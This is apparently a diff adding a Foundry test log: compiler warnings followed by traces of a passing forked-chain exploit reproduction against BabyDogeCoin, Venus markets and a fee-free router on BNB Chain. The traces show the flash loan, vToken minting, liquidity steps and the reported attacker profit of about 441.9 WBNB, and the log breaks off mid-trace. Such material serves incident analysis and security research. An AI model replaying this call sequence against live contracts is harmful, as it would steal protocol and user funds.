@@ -1,0 +1,1431 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.36s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> src/test/2023-06/BabyDogeCoin02_exp.sol:47:5:
+   |
+47 |     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:1582:1:
+     |
+1582 | interface USDT {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> src/test/2023-06/BabyDogeCoin02_exp.sol:48:5:
+   |
+48 |     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+    --> src/test/interface.sol:2080:1:
+     |
+2080 | interface WBNB {
+     | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 320.29ms (139.70µs CPU time)
+
+Ran 1 test for src/test/2023-06/BabyDogeCoin02_exp.sol:ContractTest
+[PASS] testExploit() (gas: 5339820)
+Logs:
+  Attacker WBNB balance after exploit: 441.905524988599288965
+
+Traces:
+  [6155320] ContractTest::testExploit()
+    ├─ [24562] USDT::approve(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [24562] BUSD::approve(vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [181618] Unitroller::enterMarkets([0xfD5840Cd36d94D7229439859C0112a4185BC0255, 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0xA07c5b74C9B40447a954e1466938b865b6BBea36])
+    │   ├─ [176387] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::enterMarkets([0xfD5840Cd36d94D7229439859C0112a4185BC0255, 0x95c78222B3D6e262426483D42CfA53685A67Ab9D, 0xA07c5b74C9B40447a954e1466938b865b6BBea36]) [delegatecall]
+    │   │   ├─ emit MarketEntered(rToken: vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit MarketEntered(rToken: vBUSD: [0x95c78222B3D6e262426483D42CfA53685A67Ab9D], account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ emit MarketEntered(rToken: vBNB: [0xA07c5b74C9B40447a954e1466938b865b6BBea36], account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Return] [0, 0, 0]
+    │   └─ ← [Return] [0, 0, 0]
+    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000 [1e16])
+    │   └─ ← [Return] 
+    ├─ [461010] BabyDogeRouter::swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5000000000000000}(1, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xc748673057861a797275CD8A068AbB95A902e8de], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1687350211 [1.687e9])
+    │   ├─ [23974] WBNB::deposit{value: 5000000000000000}()
+    │   │   ├─ emit Deposit(dst: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], wad: 5000000000000000 [5e15])
+    │   │   └─ ← [Stop] 
+    │   ├─ [8062] WBNB::transfer(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 5000000000000000 [5e15])
+    │   │   ├─ emit Transfer(from: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], to: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], value: 5000000000000000 [5e15])
+    │   │   └─ ← [Return] true
+    │   ├─ [114602] BabyDogeCoin::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2540] BabyDogeRouterPair::getReserves() [staticcall]
+    │   │   └─ ← [Return] 30722371624841486608762 [3.072e22], 5128829977254269558365442 [5.128e24], 1687350196 [1.687e9]
+    │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   └─ ← [Return] 30722376624841486608762 [3.072e22]
+    │   ├─ [32602] BabyDogeCoin::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [195695] BabyDogeRouterPair::swap(0, 834705927845960057 [8.347e17], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [160918] BabyDogeCoin::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 834705927845960057 [8.347e17])
+    │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 751235335061364053 [7.512e17])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   └─ ← [Return] 30722376624841486608762 [3.072e22]
+    │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   └─ ← [Return] 5128829142548341712405385 [5.128e24]
+    │   │   ├─ emit Sync(reserve0: 30722376624841486608762 [3.072e22], reserve1: 5128829142548341712405385 [5.128e24])
+    │   │   ├─ emit Swap(sender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], amount0In: 5000000000000000 [5e15], amount1In: 0, amount0Out: 0, amount1Out: 834705927845960057 [8.347e17], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   ├─ [32602] BabyDogeCoin::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 751235335150821929 [7.512e17]
+    │   └─ ← [Stop] 
+    ├─ [23974] WBNB::deposit{value: 5000000000000000}()
+    │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 5000000000000000 [5e15])
+    │   └─ ← [Stop] 
+    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 5000000000000000 [5e15]
+    ├─ [24420] WBNB::approve(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 5000000000000000 [5e15])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 5000000000000000 [5e15])
+    │   └─ ← [Return] true
+    ├─ [32602] BabyDogeCoin::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 751235335150821929 [7.512e17]
+    ├─ [24608] BabyDogeCoin::approve(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 751235335150821929 [7.512e17])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 751235335150821929 [7.512e17])
+    │   └─ ← [Return] true
+    ├─ [32602] BabyDogeCoin::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 751235335150821929 [7.512e17]
+    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 5000000000000000 [5e15]
+    ├─ [467750] FeeFreeRouter::addLiquidity(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 751225335150821929 [7.512e17], 5000000000000000 [5e15], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1687350211 [1.687e9])
+    │   ├─ [144665] BabyDogeCoin::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 751225335150821929 [7.512e17])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 751225335150821929 [7.512e17])
+    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 10000000000000 [1e13])
+    │   │   └─ ← [Return] true
+    │   ├─ [26048] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 5000000000000000 [5e15])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 5000000000000000 [5e15])
+    │   │   └─ ← [Return] true
+    │   ├─ [2638] BabyDogeCoin::allowance(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47]) [staticcall]
+    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640561219361579155546525174636 [1.157e77]
+    │   ├─ [2717] WBNB::allowance(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47]) [staticcall]
+    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    │   ├─ [204505] BabyDogeRouter::addLiquidity(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 751225335150821929 [7.512e17], 5000000000000000 [5e15], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1687350211 [1.687e9])
+    │   │   ├─ [2644] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::getPair(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   └─ ← [Return] BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]
+    │   │   ├─ [540] BabyDogeRouterPair::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 30722376624841486608762 [3.072e22], 5128829142548341712405385 [5.128e24], 1687350211 [1.687e9]
+    │   │   ├─ [117187] BabyDogeCoin::transferFrom(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 751225335150821929 [7.512e17])
+    │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], value: 751225335150821929 [7.512e17])
+    │   │   │   ├─ emit Approval(owner: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], spender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], value: 115792089237316195423570985008687907853269984665640561219360827930211374352707 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [3425] WBNB::transferFrom(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 4499940831555744 [4.499e15])
+    │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], value: 4499940831555744 [4.499e15])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [71978] BabyDogeRouterPair::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 30722381124782318164506 [3.072e22]
+    │   │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 5128829893773676863227314 [5.128e24]
+    │   │   │   ├─ [2338] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::feeTo() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x1551EAC5D2EDAa634f713A526866Ad83b82b5209
+    │   │   │   ├─ [2381] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::feeToTreasury() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000001551eac5d2edaa634f713a526866ad83b82b5209
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 56872177723905782 [5.687e16])
+    │   │   │   ├─ emit Sync(reserve0: 30722381124782318164506 [3.072e22], reserve1: 5128829893773676863227314 [5.128e24])
+    │   │   │   ├─ emit Mint(sender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], amount0: 4499940831555744 [4.499e15], amount1: 751225335150821929 [7.512e17])
+    │   │   │   └─ ← [Return] 56872177723905782 [5.687e16]
+    │   │   └─ ← [Return] 751225335150821929 [7.512e17], 4499940831555744 [4.499e15], 56872177723905782 [5.687e16]
+    │   ├─ [644] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::getPair(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   └─ ← [Return] BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]
+    │   ├─ [32602] BabyDogeCoin::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [534] WBNB::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   └─ ← [Return] 500059168444256 [5e14]
+    │   ├─ [23162] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500059168444256 [5e14])
+    │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500059168444256 [5e14])
+    │   │   └─ ← [Return] true
+    │   ├─ emit LiquidityAdded(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], param2: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], param3: 751225335150821929 [7.512e17], param4: 4499940831555744 [4.499e15], param5: 56872177723905782 [5.687e16])
+    │   └─ ← [Return] 751225335150821929 [7.512e17], 4499940831555744 [4.499e15], 56872177723905782 [5.687e16]
+    ├─ [535] BabyDogeRouterPair::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 56872177723905782 [5.687e16]
+    ├─ [24466] BabyDogeRouterPair::approve(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 56872177723905782 [5.687e16])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 56872177723905782 [5.687e16])
+    │   └─ ← [Return] true
+    ├─ [2531] USDT::balanceOf(pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818]) [staticcall]
+    │   └─ ← [Return] 18528422184084249665437559 [1.852e25]
+    ├─ [2531] BUSD::balanceOf(pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818]) [staticcall]
+    │   └─ ← [Return] 11891269826866403367786530 [1.189e25]
+    ├─ [4752086] pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18528422184084249665437559 [1.852e25], 11891269826866403367786530 [1.189e25], 0x)
+    │   ├─ [531] USDT::balanceOf(pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818]) [staticcall]
+    │   │   └─ ← [Return] 18528422184084249665437559 [1.852e25]
+    │   ├─ [531] BUSD::balanceOf(pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818]) [staticcall]
+    │   │   └─ ← [Return] 11891269826866403367786530 [1.189e25]
+    │   ├─ [10871] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18528422184084249665437559 [1.852e25])
+    │   │   ├─ emit Transfer(from: pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 18528422184084249665437559 [1.852e25])
+    │   │   └─ ← [Return] true
+    │   ├─ [27971] BUSD::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11891269826866403367786530 [1.189e25])
+    │   │   ├─ emit Transfer(from: pool: [0x4f3126d5DE26413AbDCF6948943FB9D0847d9818], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 11891269826866403367786530 [1.189e25])
+    │   │   └─ ← [Return] true
+    │   ├─ [4677071] ContractTest::pancakeV3FlashCallback(1852842218408424966544 [1.852e21], 1189126982686640336779 [1.189e21], 0x)
+    │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 18528422194084249665437559 [1.852e25]
+    │   │   ├─ [531] BUSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 11891269826866403367786530 [1.189e25]
+    │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 18528422194084249665437559 [1.852e25]
+    │   │   ├─ [146028] vUSDT::mint(18528422194084249665437559 [1.852e25])
+    │   │   │   ├─ [140768] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::mint(18528422194084249665437559 [1.852e25]) [delegatecall]
+    │   │   │   │   ├─ [85103] Unitroller::mintAllowed(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18528422194084249665437559 [1.852e25])
+    │   │   │   │   │   ├─ [84423] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::mintAllowed(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18528422194084249665437559 [1.852e25]) [delegatecall]
+    │   │   │   │   │   │   ├─ [2344] vUSDT::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1061701276261247090 [1.061e18]
+    │   │   │   │   │   │   ├─ [13844] vUSDT::exchangeRateStored() [staticcall]
+    │   │   │   │   │   │   │   ├─ [12534] vUSDT::delegateToImplementation(0x182df0f5) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [10965] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::exchangeRateStored() [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [2531] USDT::balanceOf(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 67138871168331986143586745 [6.713e25]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 223379742247415412272871317 [2.233e26]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000b8c680177952a8b2333795
+    │   │   │   │   │   │   │   └─ ← [Return] 223379742247415412272871317 [2.233e26]
+    │   │   │   │   │   │   ├─ [344] vUSDT::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1061701276261247090 [1.061e18]
+    │   │   │   │   │   │   ├─ [2561] 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63::balanceOf(Unitroller: [0xfD36E2c2a6789Db23113685031d7F16329158384]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 14801404367740170864091001 [1.48e25]
+    │   │   │   │   │   │   ├─ [5581] vUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [4145] vUSDT::delegateToImplementation(0x70a082310000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2488] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ emit DistributedSupplierVenus(param0: vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 1606131395643622516176133078929541152160241 [1.606e42])
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [531] USDT::balanceOf(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 67138871168331986143586745 [6.713e25]
+    │   │   │   │   ├─ [531] USDT::balanceOf(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 67138871168331986143586745 [6.713e25]
+    │   │   │   │   ├─ [8834] USDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], 18528422194084249665437559 [1.852e25])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], value: 18528422194084249665437559 [1.852e25])
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], value: 115792089237316195423570985008687907853269984665640545511035389923663464202376 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] USDT::balanceOf(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 85667293362416235809024304 [8.566e25]
+    │   │   │   │   ├─ emit Mint(minter: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], mintAmount: 18528422194084249665437559 [1.852e25], mintTokens: 82945848211975141 [8.294e16])
+    │   │   │   │   ├─ emit Transfer(from: vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 82945848211975141 [8.294e16])
+    │   │   │   │   ├─ [994] Unitroller::mintVerify(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18528422194084249665437559 [1.852e25], 82945848211975141 [8.294e16])
+    │   │   │   │   │   ├─ [381] 0x909dd16b24CEf96c7be13065a9a0EAF8A126FFa5::mintVerify(vUSDT: [0xfD5840Cd36d94D7229439859C0112a4185BC0255], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18528422194084249665437559 [1.852e25], 82945848211975141 [8.294e16]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [531] BUSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 11891269826866403367786530 [1.189e25]
+    │   │   ├─ [162386] vBUSD::mint(11891269826866403367786530 [1.189e25])
+    │   │   │   ├─ [159626] 0x10FB44C481F87cb4F3ce8DE11fFd16e00EC5B670::mint(11891269826866403367786530 [1.189e25]) [delegatecall]
